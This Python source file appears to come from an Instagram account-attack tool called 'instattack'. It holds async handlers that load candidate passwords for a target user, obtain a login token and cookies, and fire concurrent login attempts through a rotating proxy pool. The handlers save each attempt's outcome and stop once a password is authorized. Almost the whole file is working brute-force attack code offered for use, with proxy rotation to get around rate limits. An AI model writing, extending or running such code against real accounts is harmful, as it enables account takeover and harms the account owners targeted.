import asyncio
import aiohttp

from instattack.config import config

from instattack.lib.utils import percentage, limit_as_completed, start_and_stop
from instattack.app.exceptions import NoPasswordsError
from instattack.app.proxies import ProxyAttackPool

from instattack.app.attack.models import InstagramResults
from instattack.app.attack.utils import get_token
from instattack.app.attack.login import attempt

from .base import RequestHandler, ProxyHandler


"""
In Regard to Cancelled Tasks on Web Server Disconnect:
---------
<https://github.com/aio-libs/aiohttp/issues/2098>

Now web-handler task is cancelled on client disconnection (normal socket closing
by peer or just connection dropping by unpluging a wire etc.)

This is pretty normal behavior but it confuses people who come from world of
synchronous WSGI web frameworks like flask or django.

>>> async def handler(request):
>>>     async with request.app['db'] as conn:
>>>          await conn.execute('UPDATE ...')

The above is problematic if there is a client disconnect.

To remedy:

(1)  For client disconnections/fighting against Task cancellation I would
     recommend asyncio.shield. That's why it exists
(2)  In case user wants a way to control tasks in a more granular way, then I
     would recommend aiojobs
(3)  Ofc if user wants to execute background tasks (inside the same loop) I
      would also recommend aiojobs
"""

__all__ = (
    'AttackHandler',
    'LoginHandler'
)


class ProxyAttackHandler(ProxyHandler):

    __name__ = "Proxy Attack Handler"

    def __init__(self, loop, **kwargs):
        super(ProxyAttackHandler, self).__init__(loop, **kwargs)
        self.pool = ProxyAttackPool(loop, self.broker, start_event=self.start_event)


class BaseLoginHandler(RequestHandler):

    def __init__(self, *args, **kwargs):
        super(BaseLoginHandler, self).__init__(*args, **kwargs)

        self.user = self.loop.user
        self.attempts_to_save = []

        self._cookies = None
        self._token = None

    @property
    def token(self):
        if not self._token:
            raise RuntimeError('Token Not Found Yet')
        return self._token

    async def cookies(self):
        if not self._cookies:
            # TODO: Set timeout to the token timeout.
            sess = aiohttp.ClientSession(connector=self.connector)
            self._token, self._cookies = await get_token(sess)

            if not self._token:
                raise RuntimeError('Could not find token.')

            await sess.close()

        return self._cookies

    def login_task(self, session, password):
        context = {
            'session': session,
            'token': self.token,
            'password': password
        }
        return attempt(
            self.loop,
            context,
            pool=self.proxy_handler.pool,
            on_proxy_success=self.on_proxy_success,
            on_proxy_request_error=self.on_proxy_request_error,
            on_proxy_response_error=self.on_proxy_response_error,
        )

    async def handle_attempt(self, result):
        if config['attempts']['save_method'] == 'live':
            task = self.user.create_or_update_attempt(
                result.password,
                success=result.authorized
            )
            await self.schedule_task(task)
        else:
            if (result.password, result.authorized) not in self.attempts_to_save:
                self.attempts_to_save.append((result.password, result.authorized))

    async def finish(self):
        """
        [x] TODO:
        --------
        Figure out a way to guarantee that this always gets run even if we hit
        some type of error.
        """
        await super(BaseLoginHandler, self).finish()

        if config['attempts']['save_method'] == 'end':
            with start_and_stop(f"Saving {len(self.attempts_to_save)} Attempts"):
                tasks = [
                    self.user.create_or_update_attempt(att[0], success=att[1])
                    for att in self.attempts_to_save
                ]
                await asyncio.gather(*tasks)


class AttackHandler(BaseLoginHandler):

    __name__ = 'Attack Handler'
    __proxy_handler__ = ProxyAttackHandler

    def __init__(self, *args, **kwargs):
        super(AttackHandler, self).__init__(*args, **kwargs)

        self.passwords = asyncio.Queue()
        self.num_passwords = 0

    async def attack(self, limit=None):
        try:
            results = await asyncio.gather(
                self._attack(limit=limit),
                self.proxy_handler.run(),
            )
        except Exception as e:
            await self.finish()
            await self.proxy_handler.stop()
            raise e
        else:
            # We might not need to stop proxy handler?
            await self.proxy_handler.stop()
            return results[0]

    async def _attack(self, limit=None):
        await self.prepopulate(limit=limit)
        results = await self._login(self.loop)
        await self.finish()
        return results

    async def prepopulate(self, limit=None):
        log = self.create_logger('prepopulate')

        message = f'Generating All Attempts for User {self.user.username}.'
        if limit:
            message = (
                f'Generating {limit} '
                f'Attempts for User {self.user.username}.'
            )
        await log.start(message)

        passwords = await self.user.get_new_attempts(self.loop, limit=limit)
        if len(passwords) == 0:
            raise NoPasswordsError()

        self.num_passwords = len(passwords)
        for password in passwords:
            await self.passwords.put(password)

        await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")

    async def login_task_generator(self, session):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        log = self.create_logger('_login')

        while not self.passwords.empty():
            password = await self.passwords.get()
            if password:
                yield self.login_task(session, password)

        await log.debug('Passwords Queue is Empty')

    async def _login(self):
        """
        For each password in the queue, runs the login_with_password coroutine
        concurrently in order to validate each password.

        The login_with_password coroutine will make several concurrent requests
        using different proxies, so this is the top level of a tree of nested
        concurrent IO operations.
        """
        log = self.create_logger('_login')

        results = InstagramResults(results=[])
        cookies = await self.cookies()
        await self.start_event.wait()

        async with aiohttp.ClientSession(
            connector=self.connector,
            cookies=cookies,
            timeout=self.timeout,
        ) as session:
            gen = self.login_task_generator(session)
            async for (result, num_tries), current_attempts, current_tasks in limit_as_completed(
                gen, config['passwords']['batch_size'], self.stop_event,
            ):
                # Generator Does Not Yield None on No More Coroutines
                if result.conclusive:
                    self.num_completed += 1
                    results.add(result)

                    pct = percentage(self.num_completed, self.num_passwords)
                    await log.info(f'{pct}', extra={
                        'other': f'Num Attempts: {num_tries}',
                        'password': result.password,
                    })
                    await self.handle_attempt(result)

                    # TODO: This Causes asyncio.CancelledError
                    # await cancel_remaining_tasks(futures=current_tasks)

                    if result.authorized:
                        self.stop_event.set()
                        break

        await asyncio.sleep(0)
        await self.close_scheduler()

        return results


class LoginHandler(BaseLoginHandler):

    __name__ = 'Attack Handler'
    __proxy_handler__ = ProxyAttackHandler

    async def login(self, password):
        try:
            results = await asyncio.gather(
                self._login(password),
                self.proxy_handler.run(),
            )
        except Exception as e:
            await self.finish()
            await self.proxy_handler.stop()
            raise e
        else:
            # We might not need to stop proxy handler?
            await self.proxy_handler.stop()
            return results[0]

    async def _login(self, password):
        log = self.create_logger('_login')

        cookies = await self.cookies()
        await self.start_event.wait()

        async with aiohttp.ClientSession(
            connector=self.connector,
            cookies=cookies,
            timeout=self.timeout,
        ) as session:
            task = self.login_task(session, password)
            result, num_tries = await task

            log.debug(f'Required {num_tries} Attempts to Login')
            log.done()

            await self.handle_attempt(result)
            return result
